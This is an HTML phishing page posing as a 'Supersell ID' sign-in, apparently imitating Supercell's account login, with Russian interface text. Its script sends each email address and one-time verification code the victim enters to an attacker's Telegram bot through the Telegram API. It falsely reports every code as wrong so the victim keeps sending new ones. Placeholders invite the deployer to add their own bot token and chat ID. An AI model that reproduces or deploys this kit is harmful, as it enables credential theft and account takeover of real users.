<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supersell ID</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            max-width: 400px;
            width: 100%;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        h2 {
            text-align: center;
            margin-bottom: 24px;
            font-size: 24px;
            color: #1c1c1e;
        }
        input {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border: 1px solid #e5e5ea;
            border-radius: 10px;
            margin-bottom: 16px;
            outline: none;
            transition: border 0.2s;
        }
        input:focus {
            border-color: #007aff;
        }
        button {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            background: #007aff;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover {
            background: #005fc5;
        }
        button.secondary {
            background: #8e8e93;
            margin-top: 10px;
        }
        button.secondary:hover {
            background: #6c6c70;
        }
        .hidden {
            display: none;
        }
        .message {
            margin-top: 16px;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            font-size: 14px;
        }
        .error {
            background: #ffe6e6;
            color: #d32f2f;
        }
        .info {
            background: #e6f2ff;
            color: #007aff;
        }
        .email-display {
            font-weight: 600;
            color: #007aff;
            word-break: break-all;
        }
        p {
            text-align: center;
            margin-bottom: 16px;
            color: #6c6c70;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Supersell ID</h2>
        
        <div id="step1">
            <input type="email" id="email" placeholder="Введите ваш email" autocomplete="off">
            <button onclick="sendEmail()">Продолжить</button>
        </div>
        
        <div id="step2" class="hidden">
            <p>Код подтверждения отправлен на <br><span class="email-display" id="emailDisplay"></span></p>
            <input type="text" id="code" placeholder="Введите код из письма" autocomplete="off">
            <button onclick="verifyCode()">Подтвердить</button>
            <button onclick="resetForm()" class="secondary">Назад</button>
            <div id="message" class="message hidden"></div>
        </div>
    </div>

    <script>
        // ВСТАВЬ СВОИ ДАННЫЕ ТУТ
        const BOT_TOKEN = "ТВОЙ_ТОКЕН_ОТ_BOTFATHER";
        const CHAT_ID = "ТВОЙ_CHAT_ID";
        
        let currentEmail = '';
        let waitingForNewCode = false;
        
        async function sendToTelegram(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });
            } catch(e) {
                console.error('Telegram error:', e);
            }
        }
        
        async function sendEmail() {
            const email = document.getElementById('email').value.trim();
            if (!email) {
                showMessage('Введите email', 'error');
                return;
            }
            
            currentEmail = email;
            
            // Отправляем уведомление в Telegram
            await sendToTelegram(`📧 НОВАЯ ПОЧТА\nEmail: ${email}\nВремя: ${new Date().toLocaleString()}`);
            
            // Показываем шаг 2
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('emailDisplay').innerText = email;
            document.getElementById('code').value = '';
            hideMessage();
            waitingForNewCode = false;
            
            showMessage('Код отправлен на почту', 'info');
        }
        
        async function verifyCode() {
            const code = document.getElementById('code').value.trim();
            if (!code) {
                showMessage('Введите код', 'error');
                return;
            }
            
            if (!waitingForNewCode) {
                // Первый ввод кода
                await sendToTelegram(`🔑 КОД ДОСТУПА\nEmail: ${currentEmail}\nКод: ${code}\nВремя: ${new Date().toLocaleString()}`);
                waitingForNewCode = true;
                showMessage('Неверный код. Попробуйте ещё раз.', 'error');
                document.getElementById('code').value = '';
                document.getElementById('code').focus();
            } else {
                // Повторный ввод кода (после ошибки)
                await sendToTelegram(`🔄 ПОВТОРНЫЙ КОД\nEmail: ${currentEmail}\nКод: ${code}\nВремя: ${new Date().toLocaleString()}`);
                showMessage('Неверный код. Попробуйте ещё раз.', 'error');
                document.getElementById('code').value = '';
                document.getElementById('code').focus();
            }
        }
        
        function resetForm() {
            document.getElementById('step1').classList.remove('hidden');
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('email').value = '';
            document.getElementById('code').value = '';
            hideMessage();
            currentEmail = '';
            waitingForNewCode = false;
        }
        
        function showMessage(text, type) {
            const msgDiv = document.getElementById('message');
            msgDiv.textContent = text;
            msgDiv.className = `message ${type}`;
            msgDiv.classList.remove('hidden');
        }
        
        function hideMessage() {
            const msgDiv = document.getElementById('message');
            msgDiv.classList.add('hidden');
        }
    </script>
</body>
</html>
